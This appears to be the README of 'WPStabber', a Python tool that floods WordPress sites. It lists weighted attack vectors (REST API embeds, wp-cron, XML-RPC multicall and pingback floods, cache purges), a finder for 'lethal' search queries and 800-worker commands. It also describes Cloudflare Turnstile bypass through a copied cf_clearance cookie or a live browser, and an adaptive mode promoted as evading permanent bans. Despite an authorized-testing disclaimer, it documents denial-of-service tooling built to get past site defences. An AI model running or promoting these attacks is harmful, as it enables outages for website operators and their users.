<h1 align="center">WPStabber</h1>

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue" alt="platform" />
  <img src="https://img.shields.io/badge/python-3.8+-green" alt="python" />
  <br>
  <em>WordPress Stress Testing Framework for Security Hardening.
    <br>Multi-vector attack simulation with Cloudflare bypass capabilities.</em>
  <br>
</p>

<p align="center">
  <a href="#installation"><strong>Installation</strong></a>
  ·
  <a href="#quick-start"><strong>Quick Start</strong></a>
  ·
  <a href="#attack-vectors"><strong>Attack Vectors</strong></a>
  ·
  <a href="#search-analyzer"><strong>Search Analyzer</strong></a>
</p>

<hr>

```
█     █░ ██▓███    ██████ ▄▄▄█████▓ ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▓█░ █ ░█░▓██░  ██▒▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▓██░ ██▓▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒██▄█▓▒ ▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ▒██▒ ░  ░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░  ░▒ ░     ░ ░▒  ░ ░    ░      ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
  ░   ░  ░░       ░  ░  ░    ░        ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
    ░                   ░                 ░  ░ ░       ░         ░  ░   ░     
                                                    ░       ░                 
```

> ⚠️ **FOR AUTHORIZED PENETRATION TESTING ONLY**
> 
> Only use on systems you have explicit written permission to test.

## Documentation

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Attack Vectors](#attack-vectors)
- [Auto-Probe](#auto-probe)

### Advanced

- [Search Analyzer](#search-analyzer)
- [Cloudflare Bypass](#cloudflare-bypass)
- [Custom Search Terms](#custom-search-terms)
- [Output Indicators](#output-indicators)

## Installation

### Requirements

- Python 3.8+
- pip

### Quick Install
```bash
pip install requests

# Optional - for --bypass mode (live browser CF bypass)
pip install selenium webdriver-manager
```

### Files

| File | Description |
|------|-------------|
| `wpstabber_win.py` | Windows version (threading, 800 workers) |
| `wpstabber_linux.py` | Linux version (multiprocessing, 16×50=800) |
| `search_analyzer.py` | Find heavy DB query terms |
| `search_terms_multilingual.txt` | Basic search terms (11 languages) |
| `search_terms_massive.txt` | 2,430 terms across 14 categories |

## Quick Start

### Basic Test (No Cloudflare)
```bash
# Windows
python wpstabber_win.py -t "https://target.com" --no-cookies

# Linux
python3 wpstabber_linux.py -t "https://target.com" --no-cookies
```

### With Cloudflare (Static Cookie)
```bash
python wpstabber_win.py -t "https://target.com" -c "cf_clearance=YOUR_COOKIE"
```

### With Cloudflare (Live Browser Bypass)
```bash
python wpstabber_win.py -t "https://target.com" --bypass
```

## Auto-Probe

Before attacking, WPStabber automatically probes all WordPress endpoints to detect which vectors are available:

```
[*] Probing attack vectors...
    wp_cron          ✓
    rest_posts       ✓
    rest_pages       ✓
    rest_media       ✓
    rest_users       ✗ 403
    rest_comments    ✓
    xmlrpc           ✓
    admin_ajax       ✓
    search           ✓
    feed             ✓
    litespeed        ✗ 404

[+] 9/11 vectors available
```

Only **available** vectors are used during the attack. Blocked endpoints (403/404) are automatically skipped.

## Attack Vectors

### WordPress REST API (Heaviest)

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `rest_posts_embed` | 4x | `/wp-json/wp/v2/posts?_embed&per_page=100` | **Maximum** - Full post serialization with embedded data |
| `rest_pages_embed` | 4x | `/wp-json/wp/v2/pages?_embed&per_page=100` | **Maximum** - Full page serialization |
| `rest_media` | 2x | `/wp-json/wp/v2/media?per_page=100` | Media library enumeration |
| `rest_users` | 2x | `/wp-json/wp/v2/users?per_page=100` | User enumeration |
| `rest_comments` | 1x | `/wp-json/wp/v2/comments?per_page=100` | Comment loading |
| `rest_categories` | 1x | `/wp-json/wp/v2/categories?per_page=100` | Taxonomy queries |
| `rest_tags` | 1x | `/wp-json/wp/v2/tags?per_page=100` | Tag enumeration |

### WordPress Core

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `wp_cron` | 3x | `/wp-cron.php?doing_wp_cron=...` | PHP process spawning, scheduled tasks |
| `search` | 3x | `/?s=term+random` | DB `LIKE '%term%'` queries |
| `search_long` | 2x | `/?s={100 random chars}` | Heavy fulltext search load |
| `feed` | 1x | `/feed/` | RSS/Atom generation |

### XML-RPC

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `xmlrpc_multicall` | 2x | `/xmlrpc.php` (system.multicall × 50) | **Brutal** - 50 auth attempts per request |
| `xmlrpc_pingback` | 1x | `/xmlrpc.php` (pingback.ping) | SSRF/callback flood |

### Additional Vectors

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `admin_ajax` | 2x | `/wp-admin/admin-ajax.php` | Heartbeat/action flood |
| `litespeed` | 1x | `/?LSCWP_CTRL=purge` | LiteSpeed cache purge |
| `nginx_purge` | 1x | `/purge/*` + PURGE method | Nginx FastCGI/proxy cache |
| `apache_mod` | 1x | `/?nocache=` + headers | Apache mod_cache bypass |

## Features

| Feature | Description |
|---------|-------------|
| **Auto-Probe** | Detects available endpoints before attack |
| **15 Attack Vectors** | REST API, XML-RPC, WP-Cron, Search, Cache purge |
| **800 Concurrent Workers** | Maximum stress (configurable) |
| **Cloudflare Bypass** | Live browser with auto cookie refresh |
| **Weighted Vectors** | Heaviest endpoints hit more frequently |
| **Real-time Monitoring** | Live RPS, response times, degradation |
| **Multilingual Search** | 2,430 terms in 11 languages |

## Search Analyzer

Find which search terms cause the heaviest database load:

```bash
# Auto-discover from site content
python search_analyzer.py -t "https://target.com" --auto -o heavy.txt

# Test with massive term list
python search_analyzer.py -t "https://target.com" --terms search_terms_massive.txt
```

### Output
```
    ╔╗ ╦  ╔═╗╔═╗╔╦╗  ╔╦╗╔═╗╦═╗╔╦╗╔═╗
    ╠╩╗║  ║ ║║ ║ ║║   ║ ║╣ ╠╦╝║║║╚═╗
    ╚═╝╩═╝╚═╝╚═╝═╩╝   ╩ ╚═╝╩╚═╩ ╩╚═╝

Rank   Term                    Avg Time    vs Baseline
────────────────────────────────────────────────────────
1      smartphone recensione   2.45s        8.2x ☠️  LETHAL
2      比较                     1.89s        6.3x 🩸 HEAVY
3      обзор смартфон          1.52s        5.1x 🩸 HEAVY
```

### Attack with Heavy Terms
```bash
python wpstabber_win.py -t "https://target.com" --no-cookies --search-file heavy.txt
```

## Cloudflare Bypass

### Method 1: Static Cookie
```bash
# 1. Open target in Chrome → Solve Turnstile
# 2. DevTools → Application → Cookies → copy cf_clearance
python wpstabber_win.py -t "https://target.com" -c "cf_clearance=VALUE"
```

### Method 2: Live Browser (Recommended)
```bash
# Browser opens, solve Turnstile once, auto-refreshes every 5 min
python wpstabber_win.py -t "https://target.com" --bypass
```

## Custom Search Terms

### From File
```bash
python wpstabber_win.py -t "https://target.com" --no-cookies --search-file search_terms_massive.txt
```

### Included Term Files

**`search_terms_massive.txt`** - 2,430 terms across:
- 🖥️ Technology
- 💊 Health & Wellness  
- 💰 Finance & Banking
- ₿ Cryptocurrency
- 🛒 E-commerce
- ✈️ Travel
- 🍕 Food & Recipes
- 🎮 Gaming
- 🎓 Education
- 🏠 Real Estate
- 💼 Jobs & Careers
- 🚗 Automotive
- 💄 Beauty & Fashion
- ⚽ Sports

**Languages:** 🇬🇧 EN · 🇨🇳 ZH · 🇪🇸 ES · 🇮🇳 HI · 🇸🇦 AR · 🇧🇷 PT · 🇷🇺 RU · 🇯🇵 JA · 🇫🇷 FR · 🇩🇪 DE · 🇮🇹 IT

## Adaptive Mode

When rate limited by Cloudflare (429/529), the tool can automatically scale down requests and ramp back up when the limit lifts.

### Enable Adaptive Mode
```bash
python wpstabber_win.py -t "https://target.com" --no-cookies --adaptive
python wpstabber_win.py -t "https://target.com" --no-cookies -a  # Short flag
```

### How It Works

| Status | Action | Throttle Change |
|--------|--------|-----------------|
| **429 / 529** | Backoff | +0.5s delay (max 5s) |
| **200 / 5xx** | Ramp up | -0.1s delay |

The throttle indicator shows current delay:
```
  45s   52,384     164 | 0.89s(429) 0.45s(200) | ⏱️  429 RATE LIMITED 📉2.5s
  46s   52,548      64 | 0.92s(529) 0.48s(200) | 🔥 CF ERROR 1015 📉3.0s
  47s   52,612      64 | 0.34s(200) 0.21s(200) | ✓ RATE LIMIT LIFTED
  48s   53,876   1,264 | 0.89s(200) 0.45s(200) | STRESSED +263%
```

### Benefits
- **Evades permanent bans** - backs off before triggering hard blocks
- **Maximizes throughput** - ramps up as soon as rate limit lifts
- **Continuous testing** - maintains pressure without manual intervention
- **Smart scaling** - automatically finds the sustainable RPS

## Output Indicators

| Status | HTTP | Meaning |
|--------|------|---------|
| `HOLDING` | 200 | Server stable (<50% degradation) |
| `STRESSED` | 200 | 50-100% degradation |
| `⚠️ DEGRADED` | 200 | 100-200% degradation |
| `🔥 SEVERE` | 200 | 200-500% degradation |
| `☢️ NUCLEAR` | 200 | 500%+ degradation |
| `☠️ DOWN` | 502/0 | Server down or timeout (>30s) |
| `🛡️ BLOCKED` | 403 | Cloudflare WAF block |
| `⏱️ RATE LIMITED (429)` | 429 | Standard rate limiting |
| `🔥 CF ERROR 1015` | 529 | Cloudflare Error 1015 - Rate limited |
| `✓ RATE LIMIT LIFTED` | 200 | Rate limiting stopped, back to normal |

## Options Reference

| Flag | Description | Default |
|------|-------------|---------|
| `-t, --target` | Target URL | Required |
| `-c, --cookies` | Cookie string | None |
| `--bypass` | Live browser mode | Off |
| `--no-cookies` | Run without cookies | Off |
| `-T, --threads` | Thread count (Win) | 800 |
| `-p, --processes` | Process count (Linux) | 16 |
| `-d, --duration` | Auto-stop seconds | 0 (manual) |
| `--search-file` | Load terms from file | None |
| `-a, --adaptive` | **Auto-throttle on rate limit** | Off |

## Recommended Workflow

```bash
# 1. Find heavy search terms
python search_analyzer.py -t "https://test.com" --auto -o heavy.txt

# 2. Baseline test (unhardened)
python wpstabber_win.py -t "https://test.com" --no-cookies --search-file heavy.txt -d 60

# 3. Apply hardening (WP-Cron, rate limits, WAF rules)

# 4. Retest
python wpstabber_win.py -t "https://test.com" --no-cookies --search-file heavy.txt -d 60

# 5. Compare degradation metrics, deploy to production
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| **403 Blocked** | Use `--bypass` or fresh `cf_clearance` cookie |
| **Low RPS** | Increase `-T 1000`, check bandwidth |
| **Memory Issues** | Reduce `-p 8` and `-T 25` |
| **Browser won't open** | `pip install selenium webdriver-manager` |

## Legal

⚠️ **This tool is for authorized security testing only.**

- Only test systems you own or have written permission to test
- Unauthorized testing is illegal and unethical
- The authors are not responsible for misuse

---

<p align="center">
  <strong>WPStabber</strong>
</p>
